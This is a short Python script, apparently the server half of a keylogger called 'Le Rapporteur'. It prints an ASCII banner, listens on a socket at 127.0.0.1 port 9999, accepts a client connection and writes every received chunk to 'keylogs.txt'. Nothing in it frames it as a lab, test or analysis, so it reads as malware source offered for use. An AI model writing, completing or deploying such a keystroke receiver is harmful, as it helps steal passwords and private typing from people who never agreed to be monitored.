import socket
import pyfiglet


host = '127.0.0.1'
port = 9999
SEPARATOR = "<sep>"


ascii_banner = pyfiglet.figlet_format("Le Rapporteur", font = "slant", width=100, justify="center")
print(ascii_banner)
print("""                                                                                

                                   ....%..(*..                                  
                          .% *#..%* ./&(...*&( .*#.,%.                          
                      .&.% *,......,(.......&#.......,&.#.%                     
                  .%..%..*....@......#...,..#......@...*.,.&.*                  
                .. & .......&...........,........(.....&......& .               
             .,#&......./.....,                   ,............./&#             
            .,,....,...*..                            .......,/......           
          %........*....                                 ,..(.........(         
          &,...,.,/..                                      ......,,...&,        
        *.%..*......                                         .....*#..*/.       
       ,.%......,..*****,,,,,,,,,,,,,,,***********,,,,,,,,,,,,..#@.*...#.%      
      .&....@.%%........................,.............................. %*.     
      .*&.....*.........................,................................       
      ........@.........................,...............................#%%     
      .....................................................................     

""")

s = socket.socket()
s.bind((host, port))
s.listen(2)

def file_write(keys):
    with open("keylogs.txt","a") as file:
        for key in keys:
            file.write(key)

conn, address = s.accept()
print("-" * 50)
print(host)
print("Connected to Client: " + str(address))
print("-" * 50)
while True:
    data = conn.recv(1024).decode()
    file_write(str(data))
    if not data:
        break
    print(str(data))
conn.close()